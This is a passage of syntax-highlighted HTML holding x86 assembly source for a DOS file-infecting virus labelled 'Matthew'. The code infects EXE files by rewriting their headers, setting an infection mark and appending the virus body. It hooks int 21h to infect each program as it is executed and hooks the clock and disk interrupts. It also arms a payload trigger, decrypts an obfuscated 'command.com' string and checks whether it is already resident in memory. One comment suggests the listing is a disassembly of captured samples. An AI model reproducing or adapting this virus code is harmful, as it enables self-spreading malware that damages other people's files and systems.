       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isCxSum</span><span class="sc4">,</span><span class="sc2">277ch</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Relay5</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isCxSum</span><span class="sc4">,</span><span class="sc2">277dh</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Relay5</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isCxSum</span><span class="sc4">,</span><span class="sc2">277eh</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Relay5</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isCxSum</span><span class="sc0">                   </span><span class="sc1">; save checksum</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc5">ExeCxSm</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isCxSum</span><span class="sc4">,</span><span class="sc2">2770h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isSs</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ExeSs</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; save header ss</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isSp</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ExeSp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; save header sp</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isIp</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ExeIp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; save header ip</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isCs</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ExeCs</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; save header cs</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isBlocks</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc5">ExeBlk</span><span class="sc0">                         </span><span class="sc1">; save block count</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isMod</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc5">ExeMod</span><span class="sc0">                         </span><span class="sc1">; save mod</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">CxSumVar</span><span class="sc0">                    </span><span class="sc1">; all copies i've seen, this </span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2770h</span><span class="sc0">                       </span><span class="sc1">;    is always 0</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isCxSum</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                </span><span class="sc1">; set infect mark</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isBlocks</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isMod</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">PageAligned</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc5">PageAligned</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">
       </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isMod</span><span class="sc0">
       </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc0">                          </span><span class="sc1">; align length</span><span class="sc0">
       </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0fff0h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ExeLengthLo</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ExeLengthHi</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">VirLenConst</span><span class="sc0">
       </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Relay6</span><span class="sc0">                         </span><span class="sc1">; file too big?</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">AlignedToPage</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc5">AlignedToPage</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isBlocks</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">  
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isMod</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">ExeLengthLo</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">ExeLengthHi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
       </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isHeaderSize</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isCs</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; set up vir exe header</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isIp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MatthewEntry</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isSs</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">  
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isSp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EndVirusCode</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">Handle</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MovePointerBegin</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">28</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                         </span><span class="sc1">; write virus exe header</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
 
 </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Matthew</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">Matthew</span><span class="sc0">
 
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">ExeLengthLo</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">ExeLengthHi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                       </span><span class="sc1">; move pointer to end of file</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteVirusToFile</span><span class="sc0">               </span><span class="sc1">; infect</span><span class="sc0">
 </span><span class="sc5">Relay6</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DoneWithFile</span><span class="sc0">
 
 </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Matthew</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">nothing</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------------------- encrypted command.com</span><span class="sc0">
 
 </span><span class="sc5">EncryptedCommandComm</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">9ch</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">92h</span><span class="sc4">,</span><span class="sc2">92h</span><span class="sc4">,</span><span class="sc2">9eh</span><span class="sc4">,</span><span class="sc2">91h</span><span class="sc4">,</span><span class="sc2">9bh</span><span class="sc4">,</span><span class="sc2">0d1h</span><span class="sc4">,</span><span class="sc2">9ch</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">92h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'$'</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------------------- int 21 handler</span><span class="sc0">
 
 </span><span class="sc5">isDos</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pushf</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4b00h</span><span class="sc0">                  </span><span class="sc1">; exec </span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">PassToDos</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                        </span><span class="sc1">; save registers</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectExecutingProgram</span><span class="sc0">    </span><span class="sc1">; call infection routine</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                        </span><span class="sc1">; restore registers</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc5">PassToDos</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">popf</span><span class="sc0">                              </span><span class="sc1">; execute original int handler</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DosInterrupt</span><span class="sc0">
 
 </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Matthew</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">Matthew</span><span class="sc0">
 
 </span><span class="sc5">SaveInt21Vector</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3521h</span><span class="sc0">                  </span><span class="sc1">; get and save int 21 vector</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">DosIntSegment</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">DosIntOffset</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc5">HookInt21</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">                  </span><span class="sc1">; hook int 21</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">isDos</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc5">SaveInt08Vector</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3508h</span><span class="sc0">                  </span><span class="sc1">; get and save int 8 vector</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ClockIntSegment</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ClockIntOffset</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
 
 </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Matthew</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">nothing</span><span class="sc0">
 
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">Trigger</span><span class="sc4">,-</span><span class="sc2">16</span><span class="sc0">               </span><span class="sc1">; initialize payload trigger</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 
 </span><span class="sc5">HookInt08</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; hook int 8</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">isClock</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc5">SaveInt13Vector</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                        </span><span class="sc1">; get and save int 13 vector</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3513h</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">DiskIntSegment</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">DiskIntOffset</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc5">HookInt13</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                        </span><span class="sc1">; hook int 13</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[(</span><span class="sc2">13h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">isDisk</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">13h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc5">CommandComBuffer</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">12</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">),</span><span class="sc12">'$'</span><span class="sc0">
 
 </span><span class="sc5">GetHostNameInEnvironment</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">2ch</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; get name of host program</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">IsItStartOfFileName</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">GotStartOfFileName</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">IsItStartOfFileName</span><span class="sc0">
 </span><span class="sc5">GotStartOfFileName</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">HostNameEnvOffset</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">HostNameEnvSegment</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc5">SetCommandComForExec</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">              </span><span class="sc1">; decrypt and copy command.com for exec</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">11</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc5">DecryptAndCopyCommand</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EncryptedCommandComm</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CommandComBuffer</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">DecryptAndCopyCommand</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CommandComBuffer</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc5">ReleaseEnvironment</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                        </span><span class="sc1">; release environment to heap</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">2ch</span><span class="sc4">]</span><span class="sc0"> 
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">49h</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc5">PrepareForSetUp</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">Psp</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetHostNameInEnvironment</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc5">Psp</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------------------- check if already resident</span><span class="sc0">
 
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">MemoryMarkerLoc</span><span class="sc4">,</span><span class="sc2">87h</span><span class="sc0">     </span><span class="sc1">; myself</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">isMemoryResident</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
